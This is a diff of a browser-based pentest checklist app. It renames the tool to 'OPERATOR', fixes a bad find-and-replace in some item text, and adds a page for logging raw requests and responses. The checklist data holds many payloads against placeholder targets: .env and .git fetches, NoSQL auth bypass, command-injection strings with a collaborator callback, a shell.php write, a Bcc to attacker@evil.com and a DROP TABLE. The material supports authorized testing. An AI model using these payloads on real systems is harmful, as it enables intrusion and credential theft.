@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CHEATSHEET // Multi-Domain Pentest Checklist</title>
+<title>OPERATOR // Multi-Domain Pentest Checklist</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 :root{
@@ -256,6 +256,44 @@ footer.appfoot{text-align:center;color:var(--text-dim2);font-size:11px;margin-to
 .sb-addTestBtn{margin:2px 14px 0;padding:9px 10px;border:1px solid var(--pink-dim);border-radius:8px;color:var(--pink);font-size:11.5px;cursor:pointer;text-align:center;background:var(--panel2);}
 .sb-addTestBtn:hover{background:var(--panel);}
 
+/* ===== WORKSPACE PAGE TOGGLE (sidebar) ===== */
+.sb-pages{display:flex;flex-direction:column;gap:6px;}
+.sb-pagebtn{border:1px solid var(--line);background:var(--panel);color:var(--text-dim);padding:10px 12px;border-radius:8px;font-size:12px;cursor:pointer;}
+.sb-pagebtn:hover{border-color:var(--green-dim);color:var(--text);}
+.sb-pagebtn.active{border-color:var(--green-dim);color:var(--green-bright);background:var(--panel2);}
+
+/* ===== PRACTICAL TEST CASES PAGE ===== */
+.prToolbar{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:16px;}
+.prToolbar input[type=text]{flex:1;min-width:220px;background:var(--panel);border:1px solid var(--line);color:var(--text);padding:10px 12px;border-radius:var(--radius);font-family:var(--font-mono);font-size:12.5px;}
+.prToolbar select{background:var(--panel);border:1px solid var(--line);color:var(--text-dim);padding:9px 10px;border-radius:var(--radius);font-family:var(--font-mono);font-size:12px;}
+.prEmpty{border:1px dashed var(--line);border-radius:var(--radius);padding:40px 20px;text-align:center;color:var(--text-dim);font-size:13px;}
+.prCard{border:1px solid var(--line);background:var(--panel);border-radius:var(--radius);margin-bottom:10px;overflow:hidden;}
+.prCardHead{display:flex;align-items:flex-start;gap:12px;padding:14px 16px;cursor:pointer;}
+.prCardHeadMain{flex:1;min-width:0;}
+.prCardTitle{font-family:var(--font-display);font-size:14.5px;color:var(--text);}
+.prCardMeta{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:6px;font-size:11px;color:var(--text-dim);}
+.prBreadcrumb{color:var(--text-dim2);}
+.prBreadcrumb.prUnlinked{font-style:italic;}
+.prTimestamp{color:var(--text-dim2);}
+.prCardActions{flex:none;display:flex;gap:8px;align-items:center;}
+.badge.status-vulnerable{color:var(--red);border-color:var(--red);}
+.badge.status-not-vulnerable{color:var(--green);border-color:var(--green-dim);}
+.badge.status-inconclusive{color:var(--amber);border-color:var(--amber-dim);}
+.prCardBody{max-height:0;overflow:hidden;transition:max-height .3s ease;background:var(--panel2);}
+.prCard.open .prCardBody{max-height:3000px;}
+.prCardBodyInner{padding:4px 16px 16px 16px;}
+.prBlock{margin-top:12px;}
+.prBlockHead{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;}
+.prBlockHead .lbl{color:var(--green-dim);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;}
+.copyBtn{border:1px solid var(--line);background:var(--panel);color:var(--text-dim);padding:4px 10px;border-radius:12px;font-size:10.5px;cursor:pointer;}
+.copyBtn:hover{color:var(--green-bright);border-color:var(--green-dim);}
+.prPre{background:var(--bg);border:1px solid var(--line);color:var(--green);padding:10px 12px;border-radius:6px;font-size:11.5px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin:0;max-height:340px;overflow-y:auto;}
+.prNotes{margin-top:12px;}
+.prNotes .lbl{color:var(--green-dim);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;}
+.prNotesText{font-size:12px;color:var(--text-dim);line-height:1.6;margin-top:6px;white-space:pre-wrap;}
+.prTextarea{min-height:130px;font-family:var(--font-mono)!important;}
+#prCategoryWrap.hide,#prTestCaseWrap.hide{display:none;}
+
 /* Mobile */
 @media (max-width:860px){
   .shell{flex-direction:column;}
@@ -278,11 +316,19 @@ footer.appfoot{text-align:center;color:var(--text-dim2);font-size:11px;margin-to
   <aside class="sidebar">
     <div class="sb-brand">
       <div class="eyebrow">// authorized_testing_only</div>
-      <h1>CHEATSHEET</h1>
+      <h1>OPERATOR</h1>
       <div class="sub">Cross-discipline pentest checklist — Web, AI/LLM, Cloud, API, Mobile — plus chained attack paths. Tick as you clear each check.</div>
     </div>
 
     <div class="sb-block">
+      <div class="sb-label">Workspace</div>
+      <div class="sb-pages" id="pageTabs">
+        <div class="sb-pagebtn active" data-page="checklist">📋 Checklist</div>
+        <div class="sb-pagebtn" data-page="practical">🧾 Practical Test Cases</div>
+      </div>
+    </div>
+
+    <div class="sb-block" id="moduleBlock">
       <div class="sb-label">Module</div>
       <div class="sb-domains" id="domainTabs"></div>
     </div>
@@ -446,6 +492,69 @@ footer.appfoot{text-align:center;color:var(--text-dim2);font-size:11px;margin-to
     </div>
   </div>
 
+  <div class="modalOverlay" id="practicalModal">
+    <div class="modalBox">
+      <button class="modalClose" id="practicalClose">✕</button>
+      <h2 id="practicalModalTitle">Log a Practical Test Case</h2>
+      <div class="modalSub">Paste the exact raw request and response. Optionally link it to a specific test case in the checklist so it's easy to trace back later.</div>
+
+      <div class="ctForm">
+        <div class="ctField">
+          <label for="prTitle">Title</label>
+          <input type="text" id="prTitle" placeholder="e.g. IDOR on /api/invoices/1042 via low-priv token">
+        </div>
+
+        <div class="ctRow" style="grid-template-columns:1fr 1fr;">
+          <div class="ctField">
+            <label for="prDomain">Link to module (optional)</label>
+            <select id="prDomain"></select>
+          </div>
+          <div class="ctField">
+            <label for="prStatus">Status</label>
+            <select id="prStatus">
+              <option value="">Not set</option>
+              <option value="vulnerable">Vulnerable / confirmed</option>
+              <option value="not-vulnerable">Not vulnerable</option>
+              <option value="inconclusive">Inconclusive</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="ctField" id="prCategoryWrap">
+          <label for="prCategory">Category</label>
+          <select id="prCategory"></select>
+        </div>
+
+        <div class="ctField" id="prTestCaseWrap">
+          <label for="prTestCase">Specific test case (optional)</label>
+          <select id="prTestCase"></select>
+        </div>
+
+        <div class="ctField">
+          <label for="prRequest">Request</label>
+          <textarea id="prRequest" class="prTextarea" placeholder="GET /api/invoices/1042 HTTP/1.1&#10;Host: target.com&#10;Authorization: Bearer eyJ...&#10;..."></textarea>
+        </div>
+
+        <div class="ctField">
+          <label for="prResponse">Response</label>
+          <textarea id="prResponse" class="prTextarea" placeholder="HTTP/1.1 200 OK&#10;Content-Type: application/json&#10;..."></textarea>
+        </div>
+
+        <div class="ctField">
+          <label for="prNotes">Notes (optional)</label>
+          <textarea id="prNotes" placeholder="Impact, remediation ideas, anything else worth remembering..."></textarea>
+        </div>
+
+        <div class="ctError" id="prError">Please give this entry a title, plus the request and response you captured.</div>
+
+        <div class="ctActions">
+          <button class="ctBtnGhost" id="prCancelBtn" type="button">Cancel</button>
+          <button class="ctBtnPrimary" id="prSaveBtn" type="button">💾 Save Entry</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <main class="main">
     <div class="topbar">
       <div class="catmeta">
@@ -476,7 +585,7 @@ footer.appfoot{text-align:center;color:var(--text-dim2);font-size:11px;margin-to
 
     <div id="content"></div>
 
-    <footer class="appfoot">CHEATSHEET CHECKLIST · Web · AI/LLM · Cloud · API · Mobile · Attack Chains · per-project state stored locally · beginner / intermediate / advanced tiers reflect typical skill progression, not exploit severity</footer>
+    <footer class="appfoot">OPERATOR CHECKLIST · Web · AI/LLM · Cloud · API · Mobile · Attack Chains · per-project state stored locally · beginner / intermediate / advanced tiers reflect typical skill progression, not exploit severity</footer>
   </main>
 </div>
 
@@ -561,7 +670,7 @@ const WEB_CATEGORIES = [
     ]},
     {name:'Content Discovery & OSINT', items:[
       {t:'Directory / file brute-forcing', d:'Find hidden endpoints, backup files, admin panels not linked from the UI.', u:'`ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403`', lvl:'beginner', method:'Automated', u2:'Re-run with a second, technology-specific wordlist once the stack is identified from earlier recon.', variants:[{n:'Extension-aware fuzzing', d:'Fuzz with technology-specific extensions (.php, .aspx, .bak, .old) once the stack is fingerprinted.'}, {n:'Recursive directory discovery', d:'Recurse into discovered directories rather than a single flat pass, since nested admin paths are common.'}, {n:'Backup/source-leak wordlist', d:'Target common backup patterns (.git, .svn, .env, ~, .zip, .tar.gz) rather than only generic content wordlists.'}, {n:'Case & encoding variation', d:'Try case permutations and URL-encoded path segments to bypass naive case-sensitive block rules.'}, {n:'VHost / virtual host brute-forcing', d:'Fuzz the Host header itself against a fixed IP to discover vhosts not present in public DNS.'}, {n:'Parameter-mining alongside paths', d:'Combine path fuzzing with hidden GET/POST parameter discovery (Arjun/ParamMiner) on each found endpoint.'}, {n:'Response-length/status differential analysis', d:'Baseline a known-404 response and diff against fuzzed results to catch soft-404s a status-code filter alone would miss.'}]},
-      {t:'Google / Bing dorking', d:'Search engines index leaked docs, login panels, and error pages.', u:'`site:target.com filetype:pdf`, `site:target.com inurl:admin`, `site:target.com "index of /"`', lvl:'beginner', method:'Manual', u2:'Try dorks targeting accidentally indexed backup, SQL dump, or log files by extension.', variants:[{n:'site: + filetype: exposed docs', req:'site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx', d:'Indexed internal documents (org charts, configs, financials) frequently leak via default-permissive file hosting.'}, {n:'inurl: admin/login panel discovery', req:'site:target.com inurl:admin OR inurl:login OR inurl:dashboard', d:'Surfaces forgotten admin panels that were indexed before being properly access-restricted.'}, {n:'intitle: error/index-of exposure', req:'site:target.com intitle:"index of"', d:'Directory-listing pages indexed by Google reveal an entire exposed file tree at a glance.'}, {n:'cache: historical content recovery', req:'cache:target.com/removed-page', d:'Pulls Google\'s cached copy of a page that\'s since been taken down, sometimes still containing sensitive removed content.'}, {n:'Bing IP-block reverse lookup', req:'ip:203.0.113.0/24', d:'Bing\'s ip: CHEATSHEET can reveal other sites hosted on the same shared infrastructure as the target.'}]},
+      {t:'Google / Bing dorking', d:'Search engines index leaked docs, login panels, and error pages.', u:'`site:target.com filetype:pdf`, `site:target.com inurl:admin`, `site:target.com "index of /"`', lvl:'beginner', method:'Manual', u2:'Try dorks targeting accidentally indexed backup, SQL dump, or log files by extension.', variants:[{n:'site: + filetype: exposed docs', req:'site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx', d:'Indexed internal documents (org charts, configs, financials) frequently leak via default-permissive file hosting.'}, {n:'inurl: admin/login panel discovery', req:'site:target.com inurl:admin OR inurl:login OR inurl:dashboard', d:'Surfaces forgotten admin panels that were indexed before being properly access-restricted.'}, {n:'intitle: error/index-of exposure', req:'site:target.com intitle:"index of"', d:'Directory-listing pages indexed by Google reveal an entire exposed file tree at a glance.'}, {n:'cache: historical content recovery', req:'cache:target.com/removed-page', d:'Pulls Google\'s cached copy of a page that\'s since been taken down, sometimes still containing sensitive removed content.'}, {n:'Bing IP-block reverse lookup', req:'ip:203.0.113.0/24', d:'Bing\'s ip: operator can reveal other sites hosted on the same shared infrastructure as the target.'}]},
       {t:'Default / framework-specific files', d:'Common leftover files expose config or debug info.', u:'Check for a phpinfo file, `/.env`, `/.git/`, a stray config.json, `/.DS_Store`, or a `.bak`/`.old` copy of a config file.', lvl:'beginner', method:'Manual', u2:'Check for an exposed .well-known directory and any leftover CI/CD config files if the app is mirrored from a public repo.', variants:[{n:'Git metadata exposure', req:'curl -s https://target.com/.git/config', d:'An exposed .git directory can be pulled in full with a tool like git-dumper, recovering the entire source history.'}, {n:'Environment file exposure', req:'curl -s https://target.com/.env', d:'A misdeployed .env file is one of the single highest-value recon findings — often contains DB and API credentials directly.'}, {n:'Framework debug/console route', req:'curl -s https://target.com/_profiler OR /debug/default/view', d:'Frameworks like Symfony/Laravel ship debug toolbars or consoles that, if left enabled, allow live code execution.'}, {n:'Composer/package manifest exposure', req:'curl -s https://target.com/composer.json OR /package.json', d:'Dependency manifests confirm exact library versions in use for a fast CVE cross-reference.'}, {n:'Docker/CI config exposure', req:'curl -s https://target.com/docker-compose.yml OR /.gitlab-ci.yml', d:'Deployment config files sometimes leak internal service hostnames or even inline secrets meant only for the build environment.'}]},
       {t:'Document metadata (exiftool)', d:'PDFs/Office docs on the site can leak usernames, internal software versions, or file paths in metadata.', u:'`exiftool downloaded_report.pdf` — check Author, Producer, Company fields.', lvl:'beginner', method:'Manual', u2:'Check embedded thumbnail previews in Office files; they sometimes retain an older, unredacted version of the document.', variants:[{n:'Author/username extraction', req:'exiftool downloaded-report.pdf | grep -i author', d:'Document author fields frequently leak real internal usernames matching the corporate email/AD naming convention.'}, {n:'Software version fingerprint', req:'exiftool downloaded-report.docx | grep -i \'producer\\|creator\'', d:'The producing application\'s version can be cross-referenced for known document-generation-library CVEs.'}, {n:'GPS/location metadata leak', req:'exiftool photo.jpg | grep -i gps', d:'Image uploads (e.g. an employee-submitted photo) can leak the exact physical location it was taken.'}, {n:'Bulk metadata harvest from site downloads', req:'for f in $(curl -s site:target.com filetype:pdf); do exiftool $f; done', d:'Aggregating metadata across every indexed document builds a list of internal usernames and software versions at scale.'}, {n:'Hidden revision/track-changes recovery', req:'exiftool -a -u document.docx', d:'Office documents can retain deleted/tracked-change content in metadata even after visible acceptance of edits.'}]},
       {t:'Wayback Machine / historical URLs', d:'Old, forgotten but still-live endpoints (v1 APIs, legacy admin tools) are frequently under-tested.', u:'`waybackurls target.com | sort -u` then probe each with httpx for live 200s.', lvl:'intermediate', method:'Automated', u2:'Filter historical URLs for parameterized ones (containing an id or file parameter) — these are the most likely to still be vulnerable today.', variants:[{n:'Full historical URL pull', req:'curl -s \'http://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey\'', d:'Surfaces every URL the domain has ever served, including removed admin paths and old API versions.'}, {n:'Parameter-rich URL extraction (waybackurls/gau)', req:'echo target.com | waybackurls', d:'Historical URLs are a rich source of parameter names for later fuzzing, since dev-only debug params sometimes leak this way.'}, {n:'Removed-endpoint diffing', req:'diff <(curl -s cdx-old-list) <(current sitemap URLs)', d:'Comparing historical vs. current URL sets highlights deprecated endpoints that may still be live but undocumented.'}, {n:'Cached JS/config snapshot recovery', req:'curl -s \'http://web.archive.org/web/2020/https://target.com/config.js\'', d:'An archived snapshot of a since-hardened config file can reveal a credential or endpoint pattern still valid today.'}, {n:'Sensitive-file historical exposure check', req:'echo target.com | waybackurls | grep -iE \'\\.env|\\.git|\\.sql|\\.bak\'', d:'Wayback sometimes crawled a sensitive file during a brief window it was accidentally exposed, even if it\'s gone now.'}]},
@@ -661,7 +770,7 @@ const WEB_CATEGORIES = [
     ]},
     {name:'Injection', items:[
       {t:'SQL injection — error/union/blind', d:'Classic and still common; test every parameter, header, and cookie that touches a query.', u:'Try a single quote to trigger an error, then a UNION-based payload to map column counts, then boolean/time-based payloads if no errors surface.', lvl:'beginner', method:'Manual + Automated', u2:'If errors are suppressed, move to boolean-based blind injection using an always-true vs always-false condition and compare responses.', variants:[{n:'Error-based', d:'Trigger a raw database error via a single quote or malformed syntax to leak schema info directly in the response.'}, {n:'UNION-based', d:'Determine column count then use UNION SELECT to pull arbitrary table data into the visible response.'}, {n:'Boolean-based blind', d:'Compare responses for an always-true vs. always-false condition when no direct output/error is visible.'}, {n:'Time-based blind', d:'Use a conditional time-delay function (SLEEP/WAITFOR) to infer data one bit/character at a time via response timing.'}, {n:'Out-of-band (OOB) exfiltration', d:'Trigger a DNS/HTTP callback from the database engine itself when direct or blind channels are unavailable.'}, {n:'Second-order injection', d:'Store a payload safely in one request, then trigger a later feature that unsafely reuses that stored value in a raw query.'}, {n:'Stacked queries', d:'Test whether the driver allows chaining a second statement after a semicolon for a more powerful primitive than a single SELECT.'}, {n:'ORM/query-builder injection', d:'Target ORM \'raw\' or string-interpolated query-builder calls, which bypass the parameterization the ORM otherwise provides.'}]},
-      {t:'NoSQL injection', d:'CHEATSHEET-style injection (e.g. "not equal") into JSON bodies can bypass auth checks on document databases.', u:'Send a login payload where the password field is an object using a "not-equal-to-null" CHEATSHEET instead of a string, against a MongoDB-backed login.', lvl:'intermediate', method:'Manual', u2:'Test array-based injection too, since some ORMs interpret an array of values as an OR condition.', variants:[{n:'$ne (not-equal) auth bypass', req:'curl -X POST https://target.com/login -d \'{"user":"admin","pass":{"$ne":null}}\' -H \'Content-Type: application/json\'', d:'Against a MongoDB-backed login, this makes the password condition always true, logging in without knowing the real password.'}, {n:'$gt/$regex blind data extraction', req:'curl -X POST https://target.com/login -d \'{"user":"admin","pass":{"$regex":"^a"}}\' -H \'Content-Type: application/json\'', d:'A regex CHEATSHEET can be used to extract a password character-by-character via a blind boolean oracle.'}, {n:'Array-based CHEATSHEET injection', req:'curl -X POST https://target.com/login -d \'{"user":["admin"],"pass":["x"]}\' -H \'Content-Type: application/json\'', d:'Some ORMs interpret an array of values as an implicit OR condition, bypassing an exact-match check.'}, {n:'JavaScript $where clause injection', req:'curl -X POST https://target.com/api/search -d \'{"$where":"this.password.length > 0"}\'', d:'If $where (arbitrary JS execution inside the query) is enabled, it opens a path toward far more powerful server-side injection.'}, {n:'URL-encoded CHEATSHEET injection (form-style)', req:'curl -X POST https://target.com/login -d \'user=admin&pass[$ne]=1\'', d:'Confirms whether the CHEATSHEET-injection technique also works through a form-encoded body parsed into a nested object, not just raw JSON.'}]},
+      {t:'NoSQL injection', d:'Operator-style injection (e.g. "not equal") into JSON bodies can bypass auth checks on document databases.', u:'Send a login payload where the password field is an object using a "not-equal-to-null" operator instead of a string, against a MongoDB-backed login.', lvl:'intermediate', method:'Manual', u2:'Test array-based injection too, since some ORMs interpret an array of values as an OR condition.', variants:[{n:'$ne (not-equal) auth bypass', req:'curl -X POST https://target.com/login -d \'{"user":"admin","pass":{"$ne":null}}\' -H \'Content-Type: application/json\'', d:'Against a MongoDB-backed login, this makes the password condition always true, logging in without knowing the real password.'}, {n:'$gt/$regex blind data extraction', req:'curl -X POST https://target.com/login -d \'{"user":"admin","pass":{"$regex":"^a"}}\' -H \'Content-Type: application/json\'', d:'A regex operator can be used to extract a password character-by-character via a blind boolean oracle.'}, {n:'Array-based operator injection', req:'curl -X POST https://target.com/login -d \'{"user":["admin"],"pass":["x"]}\' -H \'Content-Type: application/json\'', d:'Some ORMs interpret an array of values as an implicit OR condition, bypassing an exact-match check.'}, {n:'JavaScript $where clause injection', req:'curl -X POST https://target.com/api/search -d \'{"$where":"this.password.length > 0"}\'', d:'If $where (arbitrary JS execution inside the query) is enabled, it opens a path toward far more powerful server-side injection.'}, {n:'URL-encoded operator injection (form-style)', req:'curl -X POST https://target.com/login -d \'user=admin&pass[$ne]=1\'', d:'Confirms whether the operator-injection technique also works through a form-encoded body parsed into a nested object, not just raw JSON.'}]},
       {t:'Command injection', d:'Inputs passed to shell commands (file conversion, ping tools, etc.) can execute arbitrary commands.', u:'On a "test connectivity" feature, chain a shell metacharacter and a harmless command (like a whoami equivalent) and watch for command output/behavioral change.', lvl:'intermediate', method:'Manual', u2:'If direct output isn\'t shown, use a time-delay payload as a blind indicator instead.', variants:[{n:'Direct output-visible injection', req:'curl -X POST https://target.com/tools/ping -d \'host=127.0.0.1; whoami\'', d:'The most direct test: chain a harmless recon command after a semicolon/pipe and check if its output appears in the response.'}, {n:'Blind time-based confirmation', req:'curl -X POST https://target.com/tools/ping -d \'host=127.0.0.1 && sleep 10\'', d:'When no output is visible, a deliberate delay confirms execution purely via response timing.'}, {n:'Blind OOB confirmation via DNS/HTTP', req:'curl -X POST https://target.com/tools/ping -d \'host=127.0.0.1; nslookup collaborator-id.burpcollaborator.net\'', d:'An out-of-band callback confirms execution even when there\'s no timing or output signal at all.'}, {n:'Alternate separator/encoding bypass', req:'curl -X POST https://target.com/tools/ping -d \'host=127.0.0.1|id\' (also test backticks, $(), newline)', d:'Different shells/filters block different separators — testing each variant (;, &&, |, backticks, $()) individually is necessary.'}, {n:'Argument-injection (non-shell) variant', req:'curl -X POST https://target.com/tools/convert -d \'file=--output=/var/www/html/shell.php\'', d:'Even without a full shell metacharacter injection, unsanitized arguments passed to a CLI tool can be abused to write files or change behavior.'}]},
       {t:'Email header injection', d:'Contact/notification forms that build email headers from user input can let an attacker inject extra headers (CC, BCC, extra recipients).', u:'Add a newline followed by an extra header line (e.g. an additional Bcc) into a "from name" or subject field and see if it lands in the sent email.', lvl:'intermediate', method:'Manual', u2:'Test both CRLF and bare-LF injection sequences, since some mail libraries only sanitize one line-ending style.', variants:[{n:'CRLF header injection (extra Bcc)', req:'curl -X POST https://target.com/contact -d \'name=x%0d%0aBcc:attacker@evil.com&email=x@x.com\'', d:'A newline sequence in a header-bound field lets you append an entirely new mail header, such as a hidden Bcc recipient.'}, {n:'Bare-LF injection variant', req:'curl -X POST https://target.com/contact -d \'name=x%0aBcc:attacker@evil.com\'', d:'Some mail libraries sanitize CRLF but miss a bare line-feed alone, which certain mail transfer agents still honor.'}, {n:'Subject-line header injection', req:'curl -X POST https://target.com/contact -d \'subject=Hello%0d%0aTo:victim@target.com\'', d:'Injecting into the subject field can redirect or duplicate the outbound message to an unintended recipient.'}, {n:'SMTP command injection via multi-line body', req:'curl -X POST https://target.com/contact -d \'message=Hi%0d%0a.%0d%0aMAIL FROM:<spoofed@evil.com>\'', d:'In rare vulnerable configurations, a crafted body can inject raw SMTP commands directly into the mail transaction.'}, {n:'From-header spoofing via display-name field', req:'curl -X POST https://target.com/contact -d \'from_name=Legit Corp <spoof@evil.com>\'', d:'A \'from name\' field concatenated unsanitized into the From header can fully spoof the visible sender identity.'}]},
       {t:'Second-order SQL injection', d:'Payload stored safely in one request but unsafely used later in a different query.', u:'Store a SQLi payload in a profile "display name" field, then trigger a report/export feature that reuses that stored value in a raw query.', lvl:'advanced', method:'Manual', u2:'Look specifically at admin-facing reporting/export features — they often reuse stored input in raw queries without the same sanitization as the main app.', variants:[{n:'Stored payload via profile field, triggered by report export', req:'Set display name to O\'Brien\'; DROP TABLE sessions;-- then trigger the admin export/report feature', d:'The payload is stored safely (escaped) on write but reused unsafely (raw-concatenated) when a later feature builds a report query from it.'}, {n:'Delayed trigger via scheduled/batch job', req:'Store a payload in a field only read by a nightly batch job, then wait for the scheduled run', d:'Second-order payloads are sometimes only reachable through an infrequent scheduled process, requiring patience beyond an immediate request/response test.'}, {n:'Cross-feature reuse of stored \'safe\' input', req:'Store a payload via a low-privilege endpoint, trigger it via a completely different, higher-privilege endpoint that reuses the same stored value', d:'Different endpoints touching the same underlying field frequently apply inconsistent sanitization.'}, {n:'Search-index reindexing trigger', req:'Store a payload in a searchable field, then trigger a manual or scheduled reindex operation', d:'Reindexing pipelines sometimes rebuild raw SQL queries from stored content in a way the original write path never did.'}, {n:'Username-based second-order injection at login', req:'Register a username containing a payload, then trigger any feature that later looks up that username in a raw query', d:'Usernames are trusted as \'already validated\' identifiers by many downstream features, making them a classic second-order vector.'}]},
@@ -1233,6 +1342,12 @@ let currentLevel = 'all';
 let currentFilter = 'all';
 let searchTerm = '';
 let currentState = {};
+let viewMode = 'checklist';
+let practicalEntries = [];
+let prSearchTerm = '';
+let prModuleFilterVal = 'all';
+let prStatusFilterVal = 'all';
+let prEditingId = null;
 
 function switchDomain(id){
   catByDomain[currentDomain] = currentCat;
@@ -1283,6 +1398,13 @@ async function loadState(projectId){
   }catch(e){ return {}; }
 }
 async function saveState(projectId, state){ try{ await STORAGE.set('state:'+projectId, JSON.stringify(state)); }catch(e){} }
+async function loadPractical(projectId){
+  try{
+    const res = await STORAGE.get('practical:'+projectId);
+    return res ? JSON.parse(res.value) : [];
+  }catch(e){ return []; }
+}
+async function savePractical(projectId, entries){ try{ await STORAGE.set('practical:'+projectId, JSON.stringify(entries)); }catch(e){} }
 
 /* =========================================================
    RENDER: PROJECT LIST (sidebar)
@@ -1317,6 +1439,7 @@ async function deleteProject(id){
   await saveProjects();
   try{ await STORAGE.delete('state:'+id); }catch(e){}
   try{ await STORAGE.delete('customitems:'+id); }catch(e){}
+  try{ await STORAGE.delete('practical:'+id); }catch(e){}
   if(currentProjectId===id){ await switchProject(projects[0].id); }
   else renderProjectList();
 }
@@ -1324,8 +1447,9 @@ async function switchProject(id){
   currentProjectId = id;
   currentState = await loadState(id);
   customItems = await loadCustomItems(id);
+  practicalEntries = await loadPractical(id);
   renderProjectList();
-  renderAll();
+  if(viewMode==='practical') renderPracticalPage(); else renderAll();
 }
 
 /* =========================================================
@@ -1658,7 +1782,7 @@ document.querySelectorAll('.filterchip').forEach(chip=>{
 });
 document.getElementById('exportBtn').addEventListener('click', ()=>{
   const proj = projects.find(p=>p.id===currentProjectId);
-  const exportObj = {project: proj, exportedAt: new Date().toISOString(), state: currentState, customTestCases: customItems};
+  const exportObj = {project: proj, exportedAt: new Date().toISOString(), state: currentState, customTestCases: customItems, practicalTestCases: practicalEntries};
   const blob = new Blob([JSON.stringify(exportObj, null, 2)], {type:'application/json'});
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
@@ -1915,12 +2039,321 @@ document.getElementById('ctSubmitBtn').addEventListener('click', async ()=>{
 });
 
 /* =========================================================
+   WORKSPACE PAGE TOGGLE (Checklist <-> Practical Test Cases)
+========================================================= */
+document.querySelectorAll('.sb-pagebtn').forEach(btn=>{
+  btn.addEventListener('click', ()=>{
+    const page = btn.dataset.page;
+    if(page === viewMode) return;
+    viewMode = page;
+    document.querySelectorAll('.sb-pagebtn').forEach(b=>b.classList.toggle('active', b.dataset.page===viewMode));
+    renderWorkspace();
+  });
+});
+function renderWorkspace(){
+  const isPractical = viewMode === 'practical';
+  document.getElementById('moduleBlock').style.display = isPractical ? 'none' : '';
+  document.getElementById('catNav').style.display = isPractical ? 'none' : '';
+  document.getElementById('sbAddTestBtn').style.display = isPractical ? 'none' : '';
+  document.querySelector('.topbar').style.display = isPractical ? 'none' : '';
+  document.querySelector('.levelbar').style.display = isPractical ? 'none' : '';
+  document.querySelector('.toolbar').style.display = isPractical ? 'none' : '';
+  if(isPractical){
+    renderPracticalPage();
+  } else {
+    renderAll();
+  }
+}
+
+/* =========================================================
+   PRACTICAL TEST CASES PAGE
+   Full raw request/response capture, stored per-project via
+   window.storage under 'practical:'+projectId.
+========================================================= */
+function renderPracticalPage(){
+  const container = document.getElementById('content');
+  container.innerHTML = `
+    <div class="topbar" style="display:flex;margin-bottom:18px;">
+      <div class="catmeta">
+        <div class="domain-eyebrow">🧾 PRACTICAL TEST CASES</div>
+        <h2>Request &amp; Response Log</h2>
+        <p>Paste the exact raw request and response for tests you've actually run — a searchable, per-engagement evidence trail stored right in this browser.</p>
+      </div>
+    </div>
+    <div class="prToolbar">
+      <input type="text" id="prSearch" placeholder="Search title, request, response, notes...">
+      <select id="prModuleFilter">
+        <option value="all">All modules</option>
+        ${DOMAINS.map(d=>`<option value="${d.id}">${d.icon} ${escapeHtml(d.name)}</option>`).join('')}
+      </select>
+      <select id="prStatusFilter">
+        <option value="all">All statuses</option>
+        <option value="vulnerable">Vulnerable / confirmed</option>
+        <option value="not-vulnerable">Not vulnerable</option>
+        <option value="inconclusive">Inconclusive</option>
+      </select>
+      <button class="smallbtn" id="prExportBtn">⇩ Export JSON</button>
+      <button class="ctBtnPrimary" id="prNewEntryBtn" style="margin-left:auto;">+ New Entry</button>
+    </div>
+    <div id="prList"></div>
+  `;
+
+  document.getElementById('prSearch').value = prSearchTerm;
+  document.getElementById('prModuleFilter').value = prModuleFilterVal;
+  document.getElementById('prStatusFilter').value = prStatusFilterVal;
+
+  document.getElementById('prSearch').addEventListener('input', (e)=>{ prSearchTerm = e.target.value; renderPrList(); });
+  document.getElementById('prModuleFilter').addEventListener('change', (e)=>{ prModuleFilterVal = e.target.value; renderPrList(); });
+  document.getElementById('prStatusFilter').addEventListener('change', (e)=>{ prStatusFilterVal = e.target.value; renderPrList(); });
+  document.getElementById('prNewEntryBtn').addEventListener('click', ()=> openPracticalModal(null));
+  document.getElementById('prExportBtn').addEventListener('click', exportPracticalJSON);
+
+  renderPrList();
+}
+
+function renderPrList(){
+  const listEl = document.getElementById('prList');
+  if(!listEl) return;
+  let entries = practicalEntries.slice().sort((a,b)=>b.updatedAt-a.updatedAt);
+  if(prModuleFilterVal !== 'all') entries = entries.filter(e=>e.domainId===prModuleFilterVal);
+  if(prStatusFilterVal !== 'all') entries = entries.filter(e=>(e.status||'')===prStatusFilterVal);
+  if(prSearchTerm.trim()){
+    const q = prSearchTerm.toLowerCase();
+    entries = entries.filter(e=>(e.title+' '+e.request+' '+e.response+' '+(e.notes||'')).toLowerCase().includes(q));
+  }
+  if(entries.length===0){
+    const filtered = prSearchTerm.trim() || prModuleFilterVal!=='all' || prStatusFilterVal!=='all';
+    listEl.innerHTML = `<div class="prEmpty">No practical test cases ${filtered?'match these filters':'logged yet'}. Click <b>+ New Entry</b> above to paste your first request/response pair.</div>`;
+    return;
+  }
+  listEl.innerHTML = '';
+  entries.forEach(e=> listEl.appendChild(renderPrCard(e)));
+}
+
+function renderPrCard(e){
+  const card = document.createElement('div');
+  card.className = 'prCard';
+  card.dataset.id = e.id;
+  const dom = e.domainId ? DOMAINS.find(d=>d.id===e.domainId) : null;
+  const cat = dom ? dom.categories.find(c=>c.id===e.catId) : null;
+  let breadcrumb = '';
+  if(dom) breadcrumb = `${dom.icon} ${escapeHtml(dom.name)}${cat ? ' › '+escapeHtml(cat.name) : ''}${e.secName ? ' › '+escapeHtml(e.secName) : ''}${e.testTitle ? ' › '+escapeHtml(e.testTitle) : ''}`;
+  const statusLabel = {vulnerable:'Vulnerable / confirmed', 'not-vulnerable':'Not vulnerable', inconclusive:'Inconclusive'}[e.status] || '';
+
+  card.innerHTML = `
+    <div class="prCardHead">
+      <div class="prCardHeadMain">
+        <div class="prCardTitle">${escapeHtml(e.title)}</div>
+        <div class="prCardMeta">
